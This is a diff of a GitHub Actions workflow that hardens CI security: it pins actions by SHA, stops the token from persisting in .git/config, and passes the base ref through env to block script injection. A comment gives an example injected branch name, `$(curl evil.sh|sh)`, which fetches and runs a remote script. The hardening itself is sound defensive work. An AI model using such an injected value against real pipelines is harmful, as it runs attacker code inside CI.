@@ -12,9 +12,16 @@ jobs:
   factory:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      # Actions are pinned by commit SHA, not by tag: a tag is a mutable
+      # pointer the action's owner can move under us, and a SHA is the only
+      # immutable release GitHub offers. The trailing comment is the version,
+      # because a bare SHA tells a reader nothing.
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
         with:
           fetch-depth: 0
+          # neither job pushes, so the token has no reason to survive in
+          # .git/config where a later step (or an uploaded artifact) can read it
+          persist-credentials: false
       # Built from source, never installed from a tag: the binary under test
       # has to be the one in the diff, or a pull request that breaks a check
       # still passes. `sf init` generates the install-from-git form, which is
@@ -25,8 +32,15 @@ jobs:
       # meaningless, and it is the cheaper failure to discover.
       - name: Prove the checks still fire
         run: ./target/release/sf verify --allow-commands
+      # base_ref is the pull request author's branch name, and on a fork they
+      # choose it. Interpolated straight into `run:` it is script injection:
+      # ${{ }} is substituted into the script before any shell sees it, so a
+      # branch named `$(curl evil.sh|sh)` executes. Through `env:` the value
+      # arrives as a variable the shell expands but never re-parses.
       - name: Check the repository
-        run: ./target/release/sf check --allow-commands --changed origin/${{ github.base_ref || 'main' }}
+        env:
+          BASE_REF: ${{ github.base_ref || 'main' }}
+        run: ./target/release/sf check --allow-commands --changed "origin/$BASE_REF"
 
   hazards:
     runs-on: ubuntu-latest
@@ -34,11 +48,14 @@ jobs:
       # fetch-depth: 0 because the secret scanner diffs against the base commit
       # on a pull request, and a shallow clone leaves it nothing to diff
       # against — it then fails with an empty result and no explanation.
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
         with:
           fetch-depth: 0
+          # neither job pushes, so the token has no reason to survive in
+          # .git/config where a later step (or an uploaded artifact) can read it
+          persist-credentials: false
       - name: Committed secrets
-        uses: gitleaks/gitleaks-action@v2
+        uses: gitleaks/gitleaks-action@ff98106e4c7b2bc287b24eaf42907196329070c7 # v2.3.9
         # The action refuses to scan a pull request without a token, and says
         # so only at run time — which is why this repository's first pull
         # request was the first run to hit it. The two flags stop the action
@@ -48,8 +65,15 @@ jobs:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           GITLEAKS_ENABLE_COMMENTS: "false"
           GITLEAKS_ENABLE_SUMMARY: "false"
+      # The `@cargo-audit` shorthand tag cannot be pinned: install-action's
+      # README warns that hash-pinning a tool tag references a commit that
+      # leaves the repository on the next release. The versioned tag plus a
+      # `tool:` input is the form that pins, and it pins cargo-audit's
+      # version too.
       - name: Dependency vulnerabilities
-        uses: taiki-e/install-action@cargo-audit
+        uses: taiki-e/install-action@a2a5f6e99e1a31540baa0468acfa302cff0f359f # v2.86.4
+        with:
+          tool: cargo-audit
       - run: cargo audit
       - name: Insecure patterns and dead code
         run: cargo clippy --all-targets -- -D warnings -D dead_code
